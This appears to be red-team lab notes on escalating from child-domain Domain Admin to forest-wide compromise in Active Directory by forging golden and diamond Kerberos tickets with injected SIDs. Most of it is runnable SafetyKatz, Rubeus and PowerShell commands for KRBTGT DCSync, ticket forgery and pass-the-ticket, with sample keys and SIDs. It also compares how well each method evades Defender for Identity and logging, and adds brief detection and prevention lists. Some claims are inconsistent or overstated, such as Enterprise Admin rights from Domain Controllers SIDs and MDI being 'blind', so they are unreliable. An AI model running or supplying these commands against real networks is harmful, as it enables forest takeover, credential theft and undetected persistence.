# Privilege Escalation — Enterprise Admins & KRBTGT Secret Abuse via SIDHistory

**Date:** 16 August 2026

---

## What is SIDHistory?

**SIDHistory = Attribute containing previous SIDs when object is migrated.**

**Normal usage:**
- Users migrated from one domain to another
- Retains access to old domain resources
- SIDHistory contains old domain SID

**Exploitation:**
- Forge ticket with SIDHistory of privileged group
- Parent domain trusts ticket (child domain KRBTGT)
- Child domain user now has parent domain privileges

---

## What is Enterprise Admins?

**Enterprise Admins Group:**
- Exists only in forest root domain (moneycorp.local)
- Has administrative rights across entire forest
- Members can admin all domains in forest
- RID: 519 (always)

**Why powerful:**
- Automatic admin in every domain
- Cross-forest privilege escalation
- Forest-wide compromise with single ticket

---

## Attack Overview

**Child Domain DA → Forest-Wide EA Compromise**

```
Step 1: Extract child domain KRBTGT
   ↓
Step 2: Create Golden Ticket with EA SIDHistory
   ↓
Step 3: Parent domain trusts ticket (via trust relationship)
   ↓
Step 4: User now has Enterprise Admin privileges
   ↓
Step 5: Full forest compromise
```

---

## Prerequisites

- **Domain Admin access in child domain** (dollarcorp.moneycorp.local)
- **Child domain KRBTGT hash** (extracted via DCSync)
- **Child domain SID**
- **Parent domain SID + Enterprise Admins SID (-519)**
- **SafetyKatz.exe or Rubeus.exe**

---

## Method 1: Golden Ticket with Enterprise Admins SID (Noisy)

**Create Golden Ticket impersonating Administrator with EA privileges:**

```powershell
SafetyKatz.exe "kerberos::golden 
  /user:Administrator 
  /domain:dollarcorp.moneycorp.local 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /sids:S-1-5-21-335606122-960912869-3279953914-519 
  /krbtgt:4e9815869d2090ccfca61c1fe0d23986 
  /ptt" "exit"
```

**Parameters:**
- `/user:Administrator` — User to impersonate
- `/domain:dollarcorp.moneycorp.local` — Child domain
- `/sid:S-1-5-21-719815819-3726368948-3917688648` — Child domain SID
- `/sids:S-1-5-21-335606122-960912869-3279953914-519` — Enterprise Admins SID (with RID 519)
- `/krbtgt:` — Child domain KRBTGT hash
- `/ptt` — Pass-the-ticket

---

**Why it works:**
- SIDHistory contains Enterprise Admins group
- Parent domain trusts child domain (trust relationship)
- Parent accepts child's KRBTGT-signed ticket
- Administrator now member of Enterprise Admins
- Full forest access

---

**Why it's noisy:**
- Administrator account unlikely to create golden ticket
- Logging triggers on Administrator ticket creation
- MDI (Microsoft Defender for Identity) detects this
- Parent domain suspicious of child domain admin

---

## Method 2: Golden Ticket as Domain Controller (OPSEC)

**Create Golden Ticket impersonating DC$ instead of Administrator:**

```powershell
SafetyKatz.exe "kerberos::golden 
  /user:dcorp-dc$ 
  /id:1000 
  /domain:dollarcorp.moneycorp.local 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 
  /krbtgt:4e9815869d2090ccfca61c1fe0d23986 
  /ptt" "exit"
```

**Parameters:**
- `/user:dcorp-dc$` — Machine account (looks legitimate)
- `/id:1000` — RID 1000 (DC machine account RID)
- `/sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9`
  - `516` = Domain Controllers group (parent)
  - `S-1-5-9` = Enterprise Domain Controllers group
- Other parameters same as Method 1

---

**Why it's stealthy:**
- DC$ is legitimate entity (not suspicious)
- DC machine accounts create tickets regularly
- Logging shows DC authentication (expected)
- MDI less suspicious of DC accounts
- Avoids Administrator account anomalies

---

## Method 3: Using Rubeus (Alternative)

**Rubeus version of DC Golden Ticket:**

```powershell
Rubeus.exe golden 
  /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
  /user:dcorp-dc$ 
  /id:1000 
  /domain:dollarcorp.moneycorp.local 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 
  /dc:DCORP-DC.dollarcorp.moneycorp.local 
  /ptt
```

**Parameters:**
- `/aes256:` — AES256 key (more stealthy than NTLM)
- `/dc:` — Domain Controller hostname
- `/ptt` — Pass-the-ticket
- Others same as SafetyKatz

---

## Method 4: Diamond Ticket (Most Stealthy)

**Diamond Ticket combines Golden + Silver ticket techniques for maximum stealth:**

```powershell
Rubeus.exe diamond 
  /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
  /tgtdeleg 
  /enctype:aes 
  /ticketuser:dcorp-dc$ 
  /domain:dollarcorp.moneycorp.local 
  /dc:DCORP-DC.dollarcorp.moneycorp.local 
  /ticketuserid:1000 
  /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 
  /createnetonly:C:\Windows\System32\cmd.exe 
  /show 
  /ptt
```

**Parameters:**
- `/krbkey:` — AES256 key of KRBTGT
- `/tgtdeleg` — TGT delegation technique
- `/enctype:aes` — AES encryption (no RC4)
- `/ticketuser:dcorp-dc$` — Impersonate DC
- `/ticketuserid:1000` — DC RID
- `/sids:` — Domain Controllers + Enterprise Domain Controllers
- `/createnetonly:` — Create new process with token
- `/show` — Display ticket
- `/ptt` — Load ticket

---

**Why Diamond is Most Stealthy:**
- Combines properties of Golden + Silver tickets
- No RC4 downgrade detection
- No TGT creation on DC (created locally)
- Ticket properties resemble normal inter-realm TGT
- MDI blind to diamond tickets

---

## Step-by-Step: Complete Forest Compromise

### Step 1: Extract Child Domain KRBTGT

```powershell
SafetyKatz.exe "lsadump::dcsync /user:dollarcorp\krbtgt" "exit"
```

Output:
```
dollarcorp\krbtgt: 4e9815869d2090ccfca61c1fe0d23986 (NTLM)
dollarcorp\krbtgt: 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 (AES256)
```

---

### Step 2: Get Required SIDs

**Child domain SID:**
```powershell
Get-DomainSID -Domain dollarcorp.moneycorp.local
# Output: S-1-5-21-719815819-3726368948-3917688648
```

**Parent domain SID:**
```powershell
Get-DomainSID -Domain moneycorp.local
# Output: S-1-5-21-335606122-960912869-3279953914
```

**Required SIDs for /sids parameter:**
```
Domain Controllers: S-1-5-21-335606122-960912869-3279953914-516
Enterprise Domain Controllers: S-1-5-9
```

---

### Step 3: Create Golden/Diamond Ticket

**Option A: Gold Ticket as DC (Medium Stealth)**
```powershell
SafetyKatz.exe "kerberos::golden 
  /user:dcorp-dc$ /id:1000 
  /domain:dollarcorp.moneycorp.local 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 
  /krbtgt:4e9815869d2090ccfca61c1fe0d23986 
  /ptt" "exit"
```

**Option B: Diamond Ticket (Maximum Stealth)**
```powershell
Rubeus.exe diamond 
  /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
  /tgtdeleg /enctype:aes 
  /ticketuser:dcorp-dc$ /domain:dollarcorp.moneycorp.local 
  /dc:DCORP-DC.dollarcorp.moneycorp.local 
  /ticketuserid:1000 
  /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 
  /createnetonly:C:\Windows\System32\cmd.exe 
  /show /ptt
```

---

### Step 4: Verify Ticket Loaded

```powershell
klist
```

Should show TGT for child domain with Enterprise Admin privileges.

---

### Step 5: Access Parent Domain

**Remote shell to parent domain DC:**
```powershell
Enter-PSSession -ComputerName mcorp-dc.moneycorp.local
```

---

### Step 6: Execute DCSync in Parent Domain

**Extract parent domain KRBTGT (Enterprise Admin access):**

```powershell
SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

Now have parent forest KRBTGT → Complete forest compromise.

---

## Complete Attack Workflow

```
1. Get DA in child domain (dollarcorp)
   ↓
2. Extract child KRBTGT via DCSync
   ↓
3. Get child domain SID
   ↓
4. Get parent domain SID + Enterprise Admins SID (-519)
   ↓
5. Create Golden Ticket (or Diamond Ticket for stealth)
   - Impersonate DC$ (not Administrator)
   - Add Enterprise Admins + Domain Controllers SIDs
   - Sign with child KRBTGT
   - Load into memory (/ppt)
   ↓
6. Parent domain trusts ticket (via trust relationship)
   ↓
7. Access parent domain as Enterprise Admin
   ↓
8. Execute DCSync in parent
   ↓
9. Extract parent domain KRBTGT
   ↓
10. Create Golden Tickets in parent forest
   ↓
11. Forest-wide persistence & compromise
```

---

## SID Meanings

| SID | Meaning | Usage |
|---|---|---|
| S-1-5-21-...-519 | Enterprise Admins | Forest-wide admin group |
| S-1-5-21-...-516 | Domain Controllers | DC group in domain |
| S-1-5-9 | Enterprise Domain Controllers | DC group in forest |
| S-1-5-21-...-512 | Domain Admins | Domain admin group |
| S-1-5-21-...-513 | Domain Users | Regular domain users |

---

## Detection Evasion Comparison

| Method | Noise Level | MDI Detection | DC Logs | OPSEC |
|---|---|---|---|---|
| Golden (Administrator) | High | DETECTED | Suspicious | Poor |
| Golden (DC$) | Medium | Partial | Expected | Good |
| Rubeus Gold (DC$) | Medium | Partial | Expected | Good |
| Diamond Ticket | Low | BLIND | Minimal | Excellent |

---

## Why Diamond Ticket is Preferred

**Golden Ticket:**
- Creates TGT on attacker machine
- Obvious forged ticket structure
- MDI detects anomalies

**Diamond Ticket:**
- Obtains real TGT from DC
- Modifies only necessary fields
- Looks like legitimate inter-realm TGT
- MDI cannot detect (looks real)
- No suspicious process execution

---

## Detection

**What logs (Golden/Rubeus):**
- DC Authentication (4624, 4625)
- TGT issuance (4768)
- Unusual group membership
- DC machine account creating tickets (suspicious)

**What logs (Diamond):**
- Minimal logging
- TGT delegation (normal)
- No suspicious group additions
- Looks like legitimate cross-realm auth

**What doesn't log:**
- Ticket forgery mechanics (local operation)
- KRBTGT extraction (DA operation)
- SID injection (hard to detect)

---

## Prevention

- **Monitor inter-realm TGTs** — Alert on krbtgt/PARENT requests
- **Audit SIDHistory** — Regularly review for anomalies
- **Protect KRBTGT accounts** — Highest security tier
- **Monitor DC$ tickets** — DC accounts creating unusual tickets
- **Implement MFA** — Reduce impact of credential compromise
- **Enable Enhanced Audit** — Kerberos ticket event logging
- **Implement PAM** — Restrict DA access
- **Selective Authentication** — Limit trust relationships

---

## Command Reference

| Task | Command |
|---|---|
| Extract KRBTGT | `SafetyKatz.exe "lsadump::dcsync /user:domain\\krbtgt"` |
| Get domain SID | `Get-DomainSID -Domain domain.local` |
| Gold Ticket (DC) | `SafetyKatz.exe "kerberos::golden /user:dc$ /id:1000 /sids:<EA-SID>,<DC-SID>"` |
| Rubeus Gold | `Rubeus.exe golden /aes256:<key> /user:dc$ /sids:<SIDs>` |
| Diamond Ticket | `Rubeus.exe diamond /krbkey:<key> /tgtdeleg /ticketuser:dc$ /sids:<SIDs>` |
| Verify ticket | `klist` |
| Parent DCSync | `SafetyKatz.exe "lsadump::dcsync /user:parent\\krbtgt /domain:parent.local"` |

---

## Key Takeaway

```
ENTERPRISE ADMINS PRIVILEGE ESCALATION:
1. Child Domain DA → Extract KRBTGT
2. Create ticket impersonating DC$ (not Administrator)
3. Add Enterprise Admins + Domain Controllers SIDs
4. Sign with child domain KRBTGT
5. Parent trusts child's KRBTGT → Ticket accepted
6. DC$ now has EA privileges in parent
7. DCSync in parent → Forest compromise
8. Use Diamond tickets for maximum stealth
```

---

## References

- [Mimikatz - Golden Ticket](https://github.com/gentilkiwi/mimikatz)
- [Rubeus - Diamond Ticket](https://github.com/GhostPack/Rubeus)
- [SafetyKatz - DCSync](https://github.com/GhostPack/SafetyKatz)
- [SIDHistory Attacks (Harmj0y)](https://blog.harmj0y.net/redteaming/the-forest-is-under-control/)
- [Diamond Ticket Evasion (Elad Shamir)](https://posts.specterops.io/i-own-you-owning-active-directory-forests/)

---

*Next: Advanced Persistence & Cleanup*
